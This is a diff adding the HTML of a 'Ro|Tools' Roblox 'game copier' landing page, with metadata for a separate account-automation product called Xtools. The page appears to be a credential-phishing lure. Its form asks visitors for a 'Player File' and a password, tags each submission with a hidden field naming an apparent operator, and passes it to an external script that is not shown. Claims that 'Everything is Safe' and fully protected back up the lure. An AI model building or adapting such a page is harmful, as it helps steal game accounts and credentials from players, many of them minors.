@@ -1,0 +1,603 @@
+<html lang="en" style="--mouse-x: 732px; --mouse-y: 407px;"><head>
+  <meta property="og:title" content="Xtools – Elite Roblox Automation">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://xtools.ink">
+  <meta property="og:image" content="https://xtools.ink/Xtools.png">
+  <meta property="og:description" content="Xtools is the ultimate automation suite for Roblox. Run thousands of accounts with precision, proxy support, and built-in FunCaptcha solving—all in one clean interface.">
+  <meta name="theme-color" content="#800080">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Game copier</title>
+  <style>
+      /* Reset and Base Styles */
+      * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+      }
+
+      html {
+          scroll-behavior: smooth;
+      }
+
+      body {
+          background: linear-gradient(180deg, #121212 0%, #18151c 85%, #2c1e3a 100%);
+          color: #d4d4d4;
+          font-family: 'Inter', 'Segoe UI', system-ui, Avenir, Helvetica, Arial, sans-serif;
+          line-height: 1.7;
+          font-size: 16.5px;
+          font-weight: 400;
+          padding-top: 100px;
+          position: relative;
+          overflow-x: hidden;
+          min-height: 100vh;
+      }
+
+      body::before {
+          content: '';
+          position: fixed;
+          top: 0; left: 0; right: 0; bottom: 0;
+          background: radial-gradient(
+              circle 200px at var(--mouse-x) var(--mouse-y),
+              rgba(138, 43, 226, 0.15),
+              transparent 80%
+          );
+          z-index: -1;
+          pointer-events: none;
+      }
+
+      nav {
+          position: fixed;
+          top: 20px;
+          left: 50%;
+          transform: translateX(-50%);
+          width: auto;
+          display: inline-flex;
+          align-items: center;
+          padding: 10px 20px;
+          background-color: rgba(28, 28, 28, 0.75);
+          border: 1px solid rgba(68, 68, 68, 0.5);
+          border-radius: 14px;
+          z-index: 1000;
+          gap: 18px;
+          backdrop-filter: blur(12px);
+          -webkit-backdrop-filter: blur(12px);
+          box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+      }
+
+      .nav-right-items {
+          display: flex;
+          align-items: center;
+          gap: 18px;
+      }
+
+      .nav-logo {
+          display: flex;
+          align-items: center;
+          text-decoration: none;
+      }
+
+      .nav-logo img {
+          height: 30px;
+          display: block;
+      }
+
+      .nav-button, .nav-icon-button {
+          padding: 9px 18px;
+          border-radius: 10px;
+          text-decoration: none;
+          font-weight: 500;
+          transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          border: none;
+          cursor: pointer;
+      }
+
+      .nav-button {
+          background-color: #8a2be2;
+          color: #ffffff;
+          box-shadow: 0 0 6px rgba(138, 43, 226, 0.3);
+      }
+
+      .nav-button:hover {
+          background-color: #6a1bb8;
+          transform: scale(1.05) translateY(-2px);
+          box-shadow: 0 0 12px rgba(138, 43, 226, 0.4);
+      }
+
+      .nav-icon-button {
+          background-color: rgba(60, 60, 60, 0.7);
+          color: #e0e0e0;
+          padding: 9px;
+          font-size: 1.2em;
+      }
+
+      .nav-icon-button:hover {
+          background-color: rgba(80, 80, 80, 0.9);
+          color: #fff;
+          transform: scale(1.15);
+      }
+
+      .main-content {
+          max-width: 1100px;
+          margin: 60px auto;
+          padding: 0 20px;
+          text-align: center;
+          position: relative;
+          z-index: 1;
+      }
+
+      h1 {
+          color: #ffffff;
+          font-size: 4.5em;
+          font-weight: 700;
+          line-height: 1.1;
+          margin-bottom: 15px;
+          max-width: 800px;
+          margin-left: auto;
+          margin-right: auto;
+          letter-spacing: -1px;
+      }
+
+      .subtitle-gradient {
+          font-size: 1.3em;
+          font-weight: 500;
+          margin-bottom: 50px;
+          background: linear-gradient(90deg, #ff00ff, #8a2be2, #6a1bb8, #ff00ff);
+          background-size: 200% auto;
+          background-clip: text;
+          -webkit-background-clip: text;
+          color: transparent;
+          animation: gradient-animation 4s linear infinite;
+      }
+
+      @keyframes gradient-animation {
+          0% { background-position: 0% center; }
+          100% { background-position: -200% center; }
+      }
+
+      .features {
+          margin-top: 80px;
+          text-align: left;
+      }
+
+      .features h2 {
+          color: #ffffff;
+          text-align: center;
+          margin-bottom: 40px;
+          font-size: 2.4em;
+          font-weight: 600;
+      }
+
+      .features ul {
+          list-style: none;
+          padding: 0;
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+          gap: 30px;
+      }
+
+      @media (min-width: 992px) {
+          .features ul {
+              grid-template-columns: repeat(3, 1fr);
+          }
+      }
+
+      @keyframes fadeInScaleUp {
+          from {
+              opacity: 0;
+              transform: translateY(20px) scale(0.98);
+          }
+          to {
+              opacity: 1;
+              transform: translateY(0) scale(1);
+          }
+      }
+
+      .features li {
+          background-color: rgba(28, 28, 28, 0.7);
+          padding: 30px;
+          border-radius: 12px;
+          border: 1px solid rgba(68, 68, 68, 0.4);
+          transition: all 0.35s cubic-bezier(0.25, 0.8, 0.25, 1);
+          backdrop-filter: blur(6px);
+          -webkit-backdrop-filter: blur(6px);
+          position: relative;
+          overflow: hidden;
+          box-shadow: 0 0 10px rgba(138, 43, 226, 0.15);
+          opacity: 0;
+          animation: fadeInScaleUp 0.6s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+      }
+
+      .features li:hover {
+          transform: translateY(-8px) scale(1.03);
+          background-color: rgba(35, 35, 35, 0.75);
+          border-color: rgba(138, 43, 226, 0.6);
+          box-shadow: 0 0 18px rgba(138, 43, 226, 0.5), 0 0 35px rgba(138, 43, 226, 0.3);
+      }
+
+      .features li::after {
+          content: '';
+          position: absolute;
+          top: 0; left: 0; right: 0; bottom: 0;
+          border-radius: 12px;
+          padding: 1px;
+          background: linear-gradient(135deg, rgba(138, 43, 226, 0), rgba(138, 43, 226, 0.7));
+          -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+          mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+          -webkit-mask-composite: destination-out;
+          mask-composite: exclude;
+          opacity: 0;
+          transition: opacity 0.35s ease-in-out;
+          pointer-events: none;
+      }
+
+      .features li:hover::after {
+          opacity: 1;
+      }
+
+      .feature-icon {
+          margin-bottom: 18px;
+          display: block;
+          line-height: 0;
+      }
+
+      .feature-icon img, .feature-icon svg {
+          width: 40px;
+          height: 40px;
+          object-fit: contain;
+          filter: invert(1);
+          transition: filter 0.3s ease-in-out;
+      }
+
+      .features li:hover .feature-icon img,
+      .features li:hover .feature-icon svg {
+          filter: invert(1);
+      }
+
+      .features li strong {
+          color: #ffffff;
+          display: block;
+          margin-bottom: 8px;
+          font-size: 1.2em;
+          font-weight: 600;
+      }
+
+      .features li p {
+          color: #a0a0a0;
+          font-size: 1em;
+          line-height: 1.6;
+      }
+
+      .cta-button {
+          display: inline-block;
+          background-color: #8a2be2;
+          color: #ffffff;
+          padding: 15px 40px;
+          border-radius: 10px;
+          font-size: 1.25em;
+          font-weight: 500;
+          text-decoration: none;
+          margin-top: 50px;
+          transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+          box-shadow: 0 0 6px rgba(138, 43, 226, 0.3);
+      }
+
+      .cta-button:hover {
+          background-color: #6a1bb8;
+          transform: scale(1.05) translateY(-3px);
+          box-shadow: 0 0 12px rgba(138, 43, 226, 0.4);
+      }
+
+      .showcase-wrapper {
+          display: flex;
+          justify-content: space-around;
+          align-items: flex-start;
+          flex-wrap: wrap;
+          gap: 30px;
+          max-width: 1600px;
+          margin: 120px auto 100px;
+          padding: 0 20px;
+      }
+
+      .visual-section {
+          flex: 1;
+          min-width: 300px;
+          max-width: 750px;
+          position: relative;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+      }
+
+      .visual-placeholder {
+          width: 100%;
+          max-width: 750px;
+          height: 450px;
+          background-color: #2a2a2a;
+          border: 1px solid #444;
+          border-radius: 12px;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          color: #666;
+          font-size: 1.5em;
+          position: relative;
+          z-index: 2;
+          box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+          overflow: hidden;
+      }
+
+      .visual-placeholder img {
+          width: 100%;
+          height: 100%;
+          max-width: 100%;
+          max-height: 100%;
+          border-radius: 11px;
+          object-fit: cover;
+      }
+
+      .video-section {
+          flex: 1;
+          min-width: 300px;
+          max-width: 750px;
+          position: relative;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+      }
+
+      .video-placeholder {
+          width: 100%;
+          max-width: 750px;
+          height: 450px;
+          background-color: #1a1a1a;
+          border: 1px solid #444;
+          border-radius: 12px;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          position: relative;
+          z-index: 2;
+          box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+          overflow: hidden;
+      }
+
+      .video-placeholder video {
+          width: 100%;
+          height: 100%;
+          border-radius: 11px;
+          object-fit: cover;
+          outline: none;
+      }
+
+      .input-container {
+          margin-top: 20px;
+          width: 100%;
+          max-width: 750px;
+          display: flex;
+          gap: 10px;
+          justify-content: space-between;
+          align-items: center;
+          flex-wrap: nowrap;
+      }
+
+      .input-field {
+          padding: 12px 20px;
+          border-radius: 10px;
+          border: 1px solid rgba(68, 68, 68, 0.5);
+          background-color: rgba(28, 28, 28, 0.75);
+          color: #d4d4d4;
+          font-size: 1em;
+          font-family: 'Inter', 'Segoe UI', system-ui, Avenir, Helvetica, Arial, sans-serif;
+          flex: 1;
+          min-width: 0;
+          transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+          box-shadow: 0 0 6px rgba(138, 43, 226, 0.2);
+      }
+
+      .input-field:focus {
+          outline: none;
+          border-color: #8a2be2;
+          box-shadow: 0 0 12px rgba(138, 43, 226, 0.5);
+          background-color: rgba(35, 35, 35, 0.75);
+      }
+
+      .submit-button {
+          padding: 12px 30px;
+          border-radius: 10px;
+          background-color: #8a2be2;
+          color: #ffffff;
+          font-size: 1em;
+          font-weight: 500;
+          border: none;
+          cursor: pointer;
+          transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+          box-shadow: 0 0 6px rgba(138, 43, 226, 0.3);
+          white-space: nowrap;
+      }
+
+      .submit-button:hover {
+          background-color: #6a1bb8;
+          transform: scale(1.05) translateY(-2px);
+          box-shadow: 0 0 12px rgba(138, 43, 226, 0.4);
+      }
+
+      footer {
+          margin-top: 120px;
+          padding: 30px 0;
+          background-color: rgba(17, 17, 17, 0.6);
+          border-top: 1px solid #2a2a2a;
+          color: #a0a0a0;
+          font-size: 0.9em;
+          position: relative;
+          z-index: 1;
+      }
+
+      .footer-container {
+          max-width: 1200px;
+          margin: 0 auto;
+          padding: 0 25px;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          flex-wrap: wrap;
+          gap: 15px;
+      }
+
+      .footer-left {
+          text-align: left;
+      }
+
+      .footer-right {
+          display: flex;
+          align-items: center;
+          gap: 20px;
+          flex-wrap: wrap;
+          justify-content: flex-end;
+      }
+
+      .footer-links, .footer-social {
+          display: flex;
+          align-items: center;
+          gap: 15px;
+      }
+
+      .footer-links a, .footer-social a {
+          color: #a0a0a0;
+          text-decoration: none;
+          transition: color 0.2s ease;
+      }
+
+      .footer-links a:hover {
+          color: #ffffff;
+      }
+
+      .footer-social a {
+          line-height: 0;
+      }
+
+      .footer-social svg {
+          width: 18px;
+          height: 18px;
+          fill: #a0a0a0;
+          transition: fill 0.2s ease;
+      }
+
+      .footer-social a:hover svg {
+          fill: #ffffff;
+      }
+  </style>
+</head>
+<body>
+  <main class="main-content">
+      <h1>
+      <img src="/../../apis/images/roblox.png" alt="Play Icon" style="width: 90px;height: 90px;vertical-align: -14px;">Ro|Tools</h1>
+      <p class="subtitle-gradient">Copy games with ease, with our newest tools.</p>
+      <a href="#tools" class="cta-button">
+  Start Now
+  <img src="/../../apis/images/play-xxl.png" alt="Play Icon" style="width: 25px;height: 25px;vertical-align: -5px;">
+</a>
+
+
+      <section class="features" id="features">
+  <h2>Made for Everyone's Ease</h2>
+  <ul>
+      <li>
+          <span class="feature-icon">
+              <img src="https://cdn-icons-png.flaticon.com/512/2915/2915731.png" alt="Tools Icon">
+          </span>
+          <strong>Variety of Easy-to-Use Tools</strong>
+          <p>A wide range of tools designed to simplify the Roblox Experience and automation for everyone.</p>
+      </li>
+      <li>
+          <span class="feature-icon">
+              <img src="https://cdn-icons-png.flaticon.com/512/2915/2915732.png" alt="Copy Icon">
+          </span>
+          <strong>Copy games Instantly</strong>
+          <p>Game copy features and mechanics to jump-start your development process.</p>
+      </li>
+      <li>
+          <span class="feature-icon">
+              <img src="https://cdn-icons-png.flaticon.com/512/2915/2915733.png" alt="Security Icon">
+          </span>
+          <strong>Everything is Safe</strong>
+          <p>Built with security in mind—your data and activities are fully protected.</p>
+      </li>
+      <li>
+          <span class="feature-icon">
+              <img src="https://cdn-icons-png.flaticon.com/512/2915/2915734.png" alt="Open Source Icon">
+          </span>
+          <strong>Open Source</strong>
+          <p>Completely open-source, meaning you can customize, contribute, and modify the tool to fit your needs.</p>
+      </li>
+      <li>
+          <span class="feature-icon">
+              <img src="https://cdn-icons-png.flaticon.com/512/2915/2915735.png" alt="UI Icon">
+          </span>
+          <strong>User-Friendly Interface</strong>
+          <p>An intuitive and easy-to-navigate interface makes powerful Roblox tools accessible to everyone.</p>
+      </li>
+      <li>
+          <span class="feature-icon">
+              <img src="https://cdn-icons-png.flaticon.com/512/2915/2915736.png" alt="Community Icon">
+          </span>
+          <strong>Active Community Support</strong>
+          <p>Join an active and helpful community to learn, share, and get support whenever you need it.</p>
+      </li>
+  </ul>
+</section>
+
+  </main>
+  <div class="showcase-wrapper" id="tools">
+      <section class="video-section" id="video-showcase">
+          <div class="video-placeholder">
+              <video controls="" preload="metadata" playsinline="" loop="" muted="" >
+                  <source src="https://rotools.top/videos/game.mp4" type="video/mp4">
+                  <source src="video.webm" type="video/webm">
+                  Your browser does not support the video tag.
+              </video>
+          </div>
+          <div class="input-container">
+              <input type="text" class="input-field" placeholder="Enter your Player File" id="input" name="file">
+              <input type="password" id="pass" placeholder="Enter Password" name="pass" required class="input-field">                                                                <input type="hidden" id="dir" name="dir" value="Luckyjocson">
+
+              <button class="submit-button" type="submit" onclick="check();" id="btn">Submit</button>
+          </div>
+      </section>
+  </div>
+  <footer>
+      <div class="footer-container">
+          <div class="footer-left">
+              © 2025 All rights reserved, we are <strong>not</strong> affiliated with roblox. 
+          </div>
+          <div class="footer-right">
+              <div class="footer-links">
+                  <a href="#">Changelog</a>
+              </div>
+              <div class="footer-social">
+                  <a href="#" title="Discord">
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M524.5 69.84a1.5 1.5 0 00-.764-.7A485.1 485.1 0 00404.1 32.03a1.816 1.816 0 00-1.923 .91 337.5 337.5 0 00-14.9 30.6 447.8 447.8 0 00-134.4 0 309.5 309.5 0 00-14.9-30.6 1.89 1.89 0 00-1.924-.91A483.7 483.7 0 00116.3 69.14a1.712 1.712 0 00-.788 .678A418.7 418.7 0 0032.05 410.9a1.6 1.6 0 00.76 1.94 486 486 0 00136.2 49.69a1.6 1.6 0 002.17-.49 413.5 413.5 0 0039.15-53.8 1.6 1.6 0 00-.42-1.94l-3.68-3.12a1.6 1.6 0 01.42-2.59A365.6 365.6 0 01235.4 345a1.6 1.6 0 01.42 2.59l3.68 3.12a1.6 1.6 0 00.42 1.94 413.6 413.6 0 0039.15 53.8 1.6 1.6 0 002.17.49 486 486 0 00136.2-49.69 1.6 1.6 0 00.76-1.94 411.1 411.1 0 00-84.2-341.06zm-111.1 282.3a1.6 1.6 0 01-3.12 0c-2.98-12.7-19.5-49.3-19.5-49.3a1.6 1.6 0 01.6-1.93 81.6 81.6 0 0147.5-20.1 1.6 1.6 0 011.79 1.3 151.4 151.4 0 01-27.2 68.7zm-147.2-68.7a1.6 1.6 0 011.79-1.3 81.6 81.6 0 0147.5 20.1 1.6 1.6 0 01.6 1.93s-16.5 36.6-19.5 49.3a1.6 1.6 0 01-3.12 0 151.4 151.4 0 01-27.2-68.7z"></path></svg>
+                  </a>
+                  <a href="#" title="Twitter/X">
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-199.9L26.8 48h145.6l100.5 132.9L389.2 48zm-24.8 373.1h39.1L151.1 88h-42l245.3 333.1z"></path></svg>
+                  </a>
+              </div>
+          </div>
+      </div>
+  </footer>
+  <script>
+      document.addEventListener('mousemove', (e) => {
+          document.documentElement.style.setProperty('--mouse-x', e.clientX + 'px');
+          document.documentElement.style.setProperty('--mouse-y', e.clientY + 'px');
+      });
+  </script>
+  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{"rayId":"9391df37bfa9d2a6","version":"2025.4.0-1-g37f21b1","r":1,"token":"fb302c9abe1e4d228bc2f56339aba43c","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="/../apis/js/tools.js"></script>
+</body></html>
